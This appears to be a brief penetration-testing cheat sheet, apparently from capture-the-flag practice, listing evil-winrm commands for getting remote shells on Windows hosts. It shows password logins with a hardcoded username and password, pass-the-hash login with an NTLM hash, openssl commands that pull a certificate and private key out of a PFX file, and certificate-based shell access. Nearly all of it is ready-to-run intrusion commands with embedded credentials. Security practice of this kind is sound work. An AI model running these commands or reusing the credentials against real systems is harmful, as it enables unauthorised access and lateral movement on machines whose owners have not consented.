# Access

```sh
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i $target
# NTLM hash
evil-winrm -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341' -i $target

```
# With a cert file

Extract cert and key from pfx file

```sh
openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out cert.pem -password pass:yourpassword
openssl pkcs12 -in yourfile.pfx -nocerts -out key.pem -nodes -password pass:yourpassword
```

Get a shell with cert

```sh
evil-winrm -S -u 'dev' -p 'supremelegacy' -c ./cert.pem -k ./key.pem -i $target
```

# Pass the hash

[Why the hell does this work?](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)

```sh
evil-winrm -i $target -u "$user" -H "$hash"
```